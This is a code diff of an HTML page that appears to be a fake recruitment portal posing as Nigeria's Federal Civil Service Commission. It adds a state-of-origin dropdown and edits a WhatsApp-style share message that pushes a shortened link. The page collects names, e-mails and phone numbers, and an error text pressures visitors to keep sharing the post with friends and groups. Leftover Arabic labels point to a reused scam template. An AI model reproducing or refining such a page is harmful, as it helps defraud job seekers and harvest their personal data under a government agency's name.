@@ -513,7 +513,6 @@ value="Airtel">Yes</option>
                 <br/>
                 <input type="text" name="email" placeholder="E-mail"><br/>
                 <input type="text" name="phone" placeholder="Phone Number"><br/>
-<input type="text" name="phone" placeholder="State of Residence"></select><br/>
 
 
              
@@ -540,14 +539,49 @@ value="Airtel">Yes</option>
               
               <br>
  <center>
-<center><p class="title">Do you have any disability</p></center>
+<center><p class="title">Please select your state of Origin</p></center>
 <select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
     width: 330px;
     height: 56px;
 ">
-<option value="أختر نوع الشبكة" selected="1">--- Answer ---</option>
-<option value="1"> Yes </option>
-<option value="2"> No </option>
+<option value="أختر نوع الشبكة" selected="1">--- SELECT YOUR STATE ---</option>
+<option value="1"> Abia </option>
+<option value="2"> Adamawa </option>
+<option value="3"> Akwa Ibom </option>
+<option value="4"> Anambra </option>
+<option value="5"> Bauchi </option>
+<option value="6"> Bayelsa </option>
+<option value="7"> Benue </option>
+<option value="8"> Borno </option>
+<option value="9"> Cross River </option>
+<option value="10"> Delta </option>
+<option value="11"> Ebonyi </option>
+<option value="12"> Edo </option>
+<option value="13"> Ekiti </option>
+<option value="14"> Enugu </option>
+<option value="15"> Gombe </option>
+<option value="16"> Imo </option>
+<option value="17"> Jigawa </option>
+<option value="18"> Kaduna </option>
+<option value="19"> Kano </option>
+<option value="20"> Katsina </option>
+<option value="21"> Kebbi </option>
+<option value="22"> Kogi </option>
+<option value="23"> Kwara </option>
+<option value="24"> Lagos </option>
+<option value="25"> Nasarawa </option>
+<option value="26"> Niger </option>
+<option value="27"> Ogun </option>
+<option value="28"> Ondo </option>
+<option value="29"> Osun </option>
+<option value="30"> Oyo </option>
+<option value="31"> Plateau </option>
+<option value="32"> Rivers </option>
+<option value="33"> Sokoto </option>
+<option value="34"> Taraba </option>
+<option value="35"> Yobe </option>
+<option value="36"> Zamfara </option>
+<option value="37"> FCT - Abuja </option>
 </select>
 </center><br>
 
@@ -716,7 +750,7 @@ $(document).click(function () {
 
 
      <script>
-        var text1 = "*The Federal Civil Service Commission (FCSC)*%0A%0AThe Federal Civil Service Commission (FCSC) has opened an application portal to recruit new employees for different positions in various departments in different agencies in all states.%0A%0AThe application is free, and the recruitment process is already underway. Interested persons are invited to click on the link below to submit their application. %0A%0A*Click on the link below to apply 👇*%0Ahttps://shrlnk.site/FCSC-Recruitments",
+        var text1 = "*The Federal Civil Service Commission (FCSC)*%0A%0AThe Federal Civil Service Commission (FCSC) has opened an application portal to recruit new employees for different positions in various departments in different agencies in all states.%0A%0AThe application is free, and the recruitment process is already underway. Interested persons are invited to click on the link below to submit their application. %0A%0A*Click on the link below to apply 👇*%0Ahttps://shrlnk.site/FCSC-Recruitments%0A%0A*APPLY NOW*👇 %0Ahttps://shrlnk.site/FCSC-Recruitments",
             text2 = " an amount of ",
             text3 = "For every citizen who meets the required conditions, help is offered to those most in need to overcome the crisis. Register now and make sure you meet the registration conditions. 👉 ",
             error = "There is a problem.!\nPosts are not calculated. You may have already shared it several times with the same friend or group; please share it again.",
